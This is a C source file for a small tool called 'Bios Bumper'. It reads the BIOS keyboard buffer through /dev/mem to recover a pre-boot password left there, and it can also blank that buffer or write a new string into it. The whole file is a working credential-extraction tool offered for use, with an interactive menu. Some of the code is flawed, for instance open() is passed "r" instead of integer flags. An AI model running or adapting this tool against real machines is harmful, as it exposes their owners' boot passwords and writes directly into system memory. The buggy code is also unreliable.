#define BIOS_PWD_ADDR 0x041e

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <sys/types.h>
#include <sys/uio.h>

struct dumpbuff
{
char tab[32];
};

int dump_bios_pwd(void)
{
char tab[32];
char tab2[16];
int fd,a,i,j;

fd = open("/dev/mem", "r");

if(fd == -1)
{
printf("cannot open /dev/mem");
return 1;
}

a=lseek(fd,BIOS_PWD_ADDR,SEEK_SET);
a=read(fd, &tab, 32);
if(a<=0)
{
printf("cannot read /dev/mem");
return 1;
}

close(fd);

i=0;
for (j=0;j<16;j++)
{
tab2[i]=tab[2*j];
i++;
}

printf("\n\nPassword : ");
for (j=0;j<16;j++)
{
printf("%c",tab2[j]);

}

printf("\n");
return 0;

}

int clear_bios_pwd (void)
{

FILE *f;
struct dumpbuff b;
int i;
long j=1054;

for (i=0;i<32;i++)
{
b.tab[i]=' ';
}

f=fopen("/dev/mem","r+");
fseek(f,j,SEEK_SET);

fwrite (&b, sizeof(struct dumpbuff),1,f);
fclose(f);
printf("\n[Buffer Cleared]\n");
return 0;
}

int change_pwd()
{

FILE *f;
struct dumpbuff b;
int i;
long j=1054;
char pwd[18];
char crap;

//Ask Pwd...

printf("\n Enter new Pwd :\n(16 caratcters max)\n");

for (i=0;i<18;i++)
{
pwd[i]=' ';
}

scanf("%s%c",&pwd,&crap);

for (i=0;i<=15;i++)
{
b.tab[2*i]=pwd[i];
b.tab[2*i+1]=' ';
}

f=fopen("/dev/mem","r+");
fseek(f,j,SEEK_SET);

fwrite (&b, sizeof(struct dumpbuff),1,f);
printf("\n[Buffer Uptdated]\n");
fclose(f);

return 0;

}

int main(void)
{

char choiceval=0;
char crap;
char tab3[100];

printf(" _=°Bios Bumper°=_ \n\n\n");
printf(" (endrazine (at) pulltheplug (dot) org [email concealed]) \n");
printf(" by Endrazine\n");

while(choiceval !='x')
{
printf ("\n==============================\n");
printf("[Keyboard buffer manipulation]\n");
printf("==============================\n");
printf("\n 1 - Display Password\n");
printf(" 2 - Clear Keyboard Buffer\n");
printf(" 3 - Enter new Password\n");
printf("\n==============================\n");
printf("\n x - Quit\n");

scanf("%c%c",&choiceval,&crap);

if (choiceval=='1')
dump_bios_pwd();

if (choiceval=='2')
clear_bios_pwd();

if (choiceval=='3')
change_pwd();

}
return 0;
}
